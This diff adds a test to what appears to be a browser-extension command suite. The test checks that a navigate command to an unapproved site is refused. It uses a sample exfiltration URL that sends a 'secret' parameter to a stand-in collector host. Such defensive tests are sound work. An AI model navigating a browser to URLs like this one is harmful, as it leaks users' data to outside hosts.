@@ -225,6 +225,18 @@ describe('desktop-issued browser commands', () => {
     expect(navigate).toHaveBeenCalledWith(TAB_ID, `${SITE}/next`);
   });
 
+  it('refuses to navigate an approved tab to a site that is not approved', async () => {
+    approveSite();
+    const navigate = vi.fn(() => Promise.resolve());
+    const result = await runDesktopBrowserCommand(
+      request('browser_navigate', { url: 'https://collector.example/?d=secret' }),
+      context(vi.fn(), navigate),
+    );
+    expect(result.ok).toBe(false);
+    expect(result.error).toContain('https://collector.example');
+    expect(navigate).not.toHaveBeenCalled();
+  });
+
   it('passes console filters through and returns the captured entries', async () => {
     approveSite();
     const send = vi.fn(async (_tabId: number, message: Record<string, unknown>) => ({
